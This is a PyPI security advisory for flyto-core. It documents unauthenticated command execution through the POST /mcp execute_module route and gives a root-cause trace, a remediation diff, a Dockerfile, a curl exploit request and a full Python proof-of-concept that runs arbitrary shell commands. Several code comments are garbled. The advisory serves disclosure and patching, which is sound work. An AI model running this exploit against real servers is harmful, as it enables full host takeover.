@@ -1,0 +1,351 @@
+PYSEC-2026-2482 PyPI/flyto-core — flyto-core has Unauthenticated Command Execution via HTTP MCP `execute_module`
+package: flyto-core
+ecosystem: PyPI
+versions affected:
+  >= 2.26.2, < 2.26.4 (ECOSYSTEM)
+aliases: CVE-2026-55786, GHSA-h9f9-h6gm-wc85
+references:
+  https://github.com/flytohub/flyto-core/security/advisories/GHSA-h9f9-h6gm-wc85
+  https://github.com/flytohub/flyto-core
+  https://pypi.org/project/flyto-core
+  https://github.com/advisories/GHSA-h9f9-h6gm-wc85
+  https://nvd.nist.gov/vuln/detail/CVE-2026-55786
+
+## Unauthenticated Command Execution via HTTP MCP `execute_module`
+
+### Summary
+
+The HTTP MCP endpoint (`POST /mcp`) in flyto-core accepts unauthenticated JSON-RPC `tools/call` requests and dispatches them to arbitrary registered modules, including `sandbox.execute_shell`, which passes attacker-controlled input directly to `asyncio.create_subprocess_shell`. An unauthenticated attacker can execute arbitrary OS commands as the flyto-core server process. By default the server binds to `127.0.0.1`, making this a High-severity local vulnerability (CVSS 8.4); if started with `--host 0.0.0.0`, it becomes remotely exploitable over the network. Dynamic reproduction confirmed command execution as `root` inside a Docker container without any `Authorization` header.
+
+### Details
+
+flyto-core exposes an HTTP API via FastAPI. When the API is started (`flyto serve`), the MCP router is unconditionally mounted at `/mcp` (`src/core/api/server.py:75-78`). The route handler at `src/core/api/routes/mcp.py:65-66` declares `@router.post("")` with **no** `Depends(require_auth)` dependency, unlike the analogous REST execution routes (`src/core/api/routes/modules.py:93`) which enforce both authentication and a module denylist.
+
+The complete unauthenticated data flow from source to sink:
+
+1. **`src/core/api/server.py:75-78`** — `mcp_router` is mounted under `/mcp` unconditionally at app creation.
+2. **`src/core/api/routes/mcp.py:65-66`** — `@router.post("")` has no `Depends(require_auth)` guard; any HTTP client may POST to this route.
+3. **`src/core/api/routes/mcp.py:79`** — the full request body (attacker-controlled JSON) is parsed without validation.
+4. **`src/core/api/routes/mcp.py:103-104`** — each JSON-RPC item is forwarded to `handle_jsonrpc_request` without a `module_filter`.
+5. **`src/core/mcp_handler.py:813-838`** — `tools/call` with name `execute_module` forwards attacker-controlled `module_id` and `params` to `execute_module()`.
+6. **`src/core/mcp_handler.py:180`, `214-215`** — the module registry resolves `module_id` and invokes it with attacker-supplied `params`.
+7. **`src/core/modules/registry/decorators.py:96-101`** — the function wrapper exposes `self.params` as `context['params']`.
+8. **`src/core/modules/atomic/sandbox/execute_shell.py:137-139`** — `command` is read directly from `params` with no sanitization.
+9. **`src/core/modules/atomic/sandbox/execute_shell.py:163-169`** — `command` reaches `asyncio.create_subprocess_shell` with `shell=True` and no allowlist or escaping.
+
+The `sandbox.execute_shell` module is not covered by the default denylist (`_DEFAULT_DENYLIST = ["shell.*", "process.*"]` at `src/core/api/security.py:126`), so even if `module_filter` were applied it would still be reachable.
+
+**Vulnerable code excerpts:**
+
+```python
+# src/core/api/routes/mcp.py:65-66  — missing auth
+@router.post("")
+async def mcp_post(request: Request):
+```
+
+```python
+# src/core/mcp_handler.py:832-838  — attacker-controlled dispatch
+elif tool_name == "execute_module":
+    result = await execute_module(
+        module_id=arguments.get("module_id", ""),
+        params=arguments.get("params", {}),
+        context=arguments.get("context"),
+        browser_sessions=browser_sessions,
+    )
+```
+
+```python
+# src/core/modules/atomic/sandbox/execute_shell.py:137-169  — sink
+params = context['params']
+command = params.get('command', '')
+# ... only empty-command and cwd existence checks ...
+proc = await asyncio.create_subprocess_shell(command, ...)
+```
+
+**Contrast with the protected REST route:**
+
+```python
+# src/core/api/routes/modules.py:93  — correctly guarded
+@router.post("/execute", dependencies=[Depends(require_auth)])
+```
+
+The existence of authentication on the REST execution routes demonstrates that a security boundary was intended; the MCP route simply omits it.
+
+### PoC
+
+**Environment setup (Docker):**
+
+```bash
+# Build the image (context: the report directory containing repo/ and vuln-001/)
+docker build \
+  -f vuln-001/Dockerfile \
+  -t flyto-vuln-001 \
+  reports/mcp_57_flytohub__flyto-core/
+
+# Start the server (binds 0.0.0.0:8333 inside the container)
+docker run --rm -d \
+  -p 127.0.0.1:8333:8333 \
+  --name flyto-vuln-001-test \
+  flyto-vuln-001
+```
+
+**Exploit (curl) — no Authorization header:**
+
+```bash
+curl -sS http://127.0.0.1:8333/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "execute_module",
+      "arguments": {
+        "module_id": "sandbox.execute_shell",
+        "params": {"command": "id", "timeout": 5}
+      }
+    }
+  }'
+```
+
+**Exploit (Python PoC script):**
+
+```bash
+python3 vuln-001/poc.py \
+  --host 127.0.0.1 --port 8333 --command id
+```
+
+**Observed response (dynamic reproduction, Phase 2):**
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "result": {
+    "structuredContent": {
+      "ok": true,
+      "data": {
+        "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
+        "stderr": "",
+        "exit_code": 0,
+        "execution_time_ms": 4.84
+      }
+    },
+    "isError": false
+  }
+}
+```
+
+The `uid=0(root)` output confirms arbitrary OS command execution without any authentication. The HTTP response status was `200 OK`.
+
+**Network-accessible variant:**
+
+If the operator starts flyto-core with `--host 0.0.0.0` (as the Dockerfile does for demonstration), the same request is reachable from any network host, changing the attack vector from Local to Network.
+
+**Recommended remediation:**
+
+```diff
+--- a/src/core/api/routes/mcp.py
++++ b/src/core/api/routes/mcp.py
+-from fastapi import APIRouter, Request
++from fastapi import APIRouter, Depends, Request
+ from fastapi.responses import JSONResponse, Response
+ from core.mcp_handler import handle_jsonrpc_request
++from core.api.security import require_auth, module_filter
+
+-@router.post("")
++@router.post("", dependencies=[Depends(require_auth)])
+ async def mcp_post(request: Request):
+         result = await handle_jsonrpc_request(item, browser_sessions)
++        result = await handle_jsonrpc_request(item, browser_sessions, module_filter=module_filter)
+
+-@router.delete("")
++@router.delete("", dependencies=[Depends(require_auth)])
+ async def mcp_delete(request: Request):
+```
+
+```diff
+--- a/src/core/api/security.py
++++ b/src/core/api/security.py
+-_DEFAULT_DENYLIST = ["shell.*", "process.*"]
++_DEFAULT_DENYLIST = ["shell.*", "process.*", "sandbox.*"]
+```
+
+### Impact
+
+This is an **unauthenticated OS command injection** vulnerability. Any process that can reach the `POST /mcp` HTTP endpoint (locally by default, or remotely if the server is bound to a non-loopback interface) can execute arbitrary shell commands with the full privileges of the flyto-core server process. In the dynamic reproduction, the server ran as `root`, meaning full system compromise is possible.
+
+Affected parties include:
+
+- **Developers and local users** running `flyto serve` on their workstations — any other local process (e.g., malicious code in a browser tab or another installed application) can pivot through the loopback interface.
+- **Infrastructure operators** who expose the API on a non-loopback interface (`--host 0.0.0.0`) without network-level access controls — the attack surface becomes the entire network.
+
+Potential consequences include arbitrary file read/write, credential exfiltration, lateral movement, and full host takeover.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+FROM python:3.12-slim
+
+# lxml buildtext requiredtext whentext text
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    gcc g++ libxml2-dev libxslt1-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+# local repo copy source (build context: mcp_57_flytohub__flyto-core/)
+COPY repo/ /app/repo/
+
+# flyto-core[api] install (fastapi + uvicorn contains)
+RUN pip install --no-cache-dir "/app/repo[api]"
+
+EXPOSE 8333
+
+# container externalfrom accessibletext 0.0.0.0 binding
+CMD ["python", "-c", "from core.api.server import main; main(host='0.0.0.0', port=8333)"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+"""
+VULN-001 PoC: Unauthenticated Command Execution via HTTP MCP execute_module
+
+Target:  flyto-core 2.26.2
+Route:   POST /mcp  (no auth dependency — mcp.py:65)
+Sink:    asyncio.create_subprocess_shell  (execute_shell.py:163)
+CWE:     CWE-306 Missing Authentication for Critical Function
+
+Usage:
+    python3 poc.py [--host 127.0.0.1] [--port 8333] [--command id]
+"""
+import sys
+import time
+import json
+import argparse
+import urllib.request
+import urllib.error
+
+
+def wait_for_server(base_url: str, max_wait: int = 45) -> bool:
+    """servertext readytext until /health text."""
+    for i in range(max_wait):
+        try:
+            with urllib.request.urlopen(f"{base_url}/health", timeout=2) as resp:
+                if resp.status == 200:
+                    print(f"[+] server is ready ({i}s textand)")
+                    return True
+        except Exception:
+            pass
+        time.sleep(1)
+        if i % 5 == 4:
+            print(f"[*] wait in progress... ({i+1}s)")
+    return False
+
+
+def send_exploit(base_url: str, command: str) -> dict:
+    """without authentication POST /mcptext arbitrary command execute request."""
+    payload = {
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "tools/call",
+        "params": {
+            "name": "execute_module",
+            "arguments": {
+                "module_id": "sandbox.execute_shell",
+                "params": {
+                    "command": command,
+                    "timeout": 10
+                }
+            }
+        }
+    }
+
+    data = json.dumps(payload).encode("utf-8")
+    req = urllib.request.Request(
+        f"{base_url}/mcp",
+        data=data,
+        headers={"Content-Type": "application/json"},
+        method="POST",
+    )
+
+    with urllib.request.urlopen(req, timeout=20) as resp:
+        body = resp.read().decode("utf-8")
+
+    return json.loads(body)
+
+
+def main():
+    parser = argparse.ArgumentParser(description="VULN-001 PoC — flyto-core unauthenticated RCE via MCP")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=8333)
+    parser.add_argument("--command", default="id", help="OS command to execute (default: id)")
+    args = parser.parse_args()
+
+    base_url = f"http://{args.host}:{args.port}"
+
+    print("=" * 60)
+    print("VULN-001: Unauthenticated RCE via HTTP MCP execute_module")
+    print(f"  Target  : {base_url}/mcp")
+    print(f"  Command : {args.command}")
+    print("=" * 60)
+    print()
+
+    # 1. wait for server readiness
+    print("[*] waiting for server startup in progress...")
+    if not wait_for_server(base_url):
+        print("[-] FAIL: servertext whenbetween within not respond not")
+        sys.exit(1)
+
+    # 2. without authentication exploit send request
+    print(f"\n[*] POST {base_url}/mcp — without an Authorization header send")
+    try:
+        result = send_exploit(base_url, args.command)
+    except urllib.error.HTTPError as e:
+        body = e.read().decode("utf-8", errors="replace")
+        print(f"[-] HTTP {e.code}: {body}")
+        print("[-] FAIL: servertext requesttext rejected (vulnerability none or text textdone)")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] text error: {e}")
+        sys.exit(1)
+
+    # 3. response parse
+    print(f"\n[*] Raw JSON response:\n{json.dumps(result, indent=2, ensure_ascii=False)}\n")
+
+    # result.result.structuredContent.data.stdout
+    try:
+        structured = result["result"]["structuredContent"]
+        data = structured["data"]
+        stdout = data.get("stdout", "")
+        stderr = data.get("stderr", "")
+        exit_code = data.get("exit_code", -1)
+    except (KeyError, TypeError) as e:
+        print(f"[-] FAIL: expected response structure text — {e}")
+        print(f"    result keys: {list(result.get('result', {}).keys())}")
+        sys.exit(1)
+
+    print(f"[*] exit_code = {exit_code}")
+    print(f"[*] stdout    = {stdout!r}")
+    print(f"[*] stderr    = {stderr!r}")
+    print()
+
+    # 4. success verdict: `id` command resulttext uid= contains whether
+    if "uid=" in stdout:
+        print("[+] ============================================================")
+        print("[+] PASS: without authentication text OS command execution check!")
+        print(f"[+] command output: {stdout.strip()}")
+        print("[+] ============================================================")
+        sys.exit(0)
+    else:
+        print("[-] FAIL: stdouttext 'uid=' none — commandtext executenot text outputtext different")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
